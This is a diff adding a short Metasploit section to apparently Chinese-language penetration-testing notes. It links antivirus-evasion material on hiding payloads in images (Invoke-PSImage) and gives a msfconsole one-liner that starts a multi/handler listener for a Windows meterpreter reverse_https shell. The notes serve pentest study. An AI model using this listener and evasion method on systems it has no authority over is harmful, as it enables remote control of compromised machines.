@@ -1303,3 +1303,18 @@ https://xz.aliyun.com/t/2860
 
 https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/
 https://www.andreafortuna.org/2017/12/11/metasploit-console-my-own-cheatsheet/
+
+### msfconsole
+
+一次执行
+
+[渗透测试之地基免杀篇：隐写RGB过所有杀软](https://www.freebuf.com/articles/web/262978.html)
+
+https://github.com/dayuxiyou/Invoke-PSImage
+git clone git@gitee.com:azhao-1981/Invoke-PSImage.git
+3、MSF生成后门
+NOTE: 直接运行 msfconsole 的方法
+
+```bash
+msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost 192.168.253.8; set lport 5555; exploit -j; "
+```
